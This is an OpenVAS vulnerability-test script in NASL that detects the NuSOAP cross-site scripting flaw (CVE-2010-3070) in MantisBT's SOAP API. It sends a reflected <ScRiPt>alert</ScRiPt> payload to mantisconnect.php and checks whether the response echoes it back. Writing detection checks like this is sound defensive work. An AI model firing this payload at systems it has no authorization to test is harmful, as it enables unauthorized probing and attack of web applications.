##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mantisbt_nusoap_xss_vuln.nasl 8296 2018-01-05 07:28:01Z teissa $
#
# NuSOAP 'nusoap.php' Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
script code in the browser of an unsuspecting user in the context of the
affected site.

Impact Level: Application.";

tag_affected = "NuSOAP version 0.9.5.";

tag_insight = "The flaw is due to an input validation error in
/api/soap/mantisconnect.php in NuSOAP.";

tag_solution = "Apply the patch provided by vendor. For updates refer to
http://nusoap.sourceforge.net/";

tag_summary = "This host is running NuSOAP and is prone to Cross-site scripting
  Vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902318");
  script_version("$Revision: 8296 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-05 08:28:01 +0100 (Fri, 05 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-10-01 08:36:34 +0200 (Fri, 01 Oct 2010)");
  script_cve_id("CVE-2010-3070");
  script_bugtraq_id(42959);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("NuSOAP 'nusoap.php' Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://www.mantisbt.org/bugs/view.php?id=12312");
  script_xref(name : "URL" , value : "http://sourceforge.net/projects/nusoap/forums/forum/193579/topic/3834005");
  script_xref(name : "URL" , value : "http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048325.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_dependencies("mantis_detect.nasl");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  exit(0);
}
		

include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
mPort = get_http_port(default:80);
if(!get_port_state(mPort)){
  exit(0);
}

## GET the Mantis path from KB
mPath = get_dir_from_kb(port:mPort,app:"mantis");
if(mPath != NULL)
{
  ## Check for the existence of NuSOAP
  sndReq = http_get(item:string(mPath, "/api/soap/mantisconnect.php"), port:mPort);
  rcvRes = http_send_recv(port:mPort, data:sndReq);
  
  ## Check for the existence of NuSOAP
  if("<title>NuSOAP:" >< rcvRes)
  {
    ## Try Exploit
    sndReq = http_get(item:string(mPath, '/api/soap/mantisconnect.php' +
                      '/1<ScRiPt>alert("OpenVAS-XSS-Testing")</ScRiPt>'), port:mPort);
    rcvRes = http_send_recv(port:mPort, data:sndReq);

    ## Check Response to confirm vulnerability
    if(rcvRes =~ "HTTP/1\.. 200" && '<ScRiPt>alert("OpenVAS-XSS-Testing")</ScRiPt>' >< rcvRes){
       security_message(mPort);
    }
  }
}
